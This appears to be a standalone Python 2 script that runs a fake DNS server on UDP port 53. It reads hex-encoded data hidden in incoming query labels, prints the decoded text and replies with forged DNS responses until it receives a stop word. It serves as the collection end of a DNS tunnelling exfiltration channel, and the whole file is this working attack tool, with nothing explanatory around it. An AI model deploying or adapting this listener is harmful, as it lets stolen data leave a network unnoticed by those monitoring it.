import socket, sys
	
def listen():
	# enable udp bind on 0.0.0.0:53
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.bind(('',53))
	decoded_prev = ""
	while True:
		# get dns query, send response and decode data
		raw_data, addr = sock.recvfrom(1024)
		UDP_IP = addr[0]
		UDP_PORT = addr[1]
		transaction_id = raw_data[0:2] # transaction_id needed to send response
		stop = raw_data.find("fake")
		data = raw_data[13:stop-1]
		response = transaction_id+"81830001000000010000".decode("hex")+data+"000006000100000562004001610c726f6f742d73657276657273036e657400056e73746c640c766572697369676e2d67727303636f6d00781c2884000007080000038400093a8000015180".decode("hex")
		if data == "66696e65": # stop		
			break
		try:
			decoded = data.decode("hex")
			if decoded != decoded_prev:
				sys.stdout.write(decoded)
				decoded_prev = decoded
		except Exception, e:
			print "\nException: "+str(e)
		sock.sendto(response, (UDP_IP, UDP_PORT))


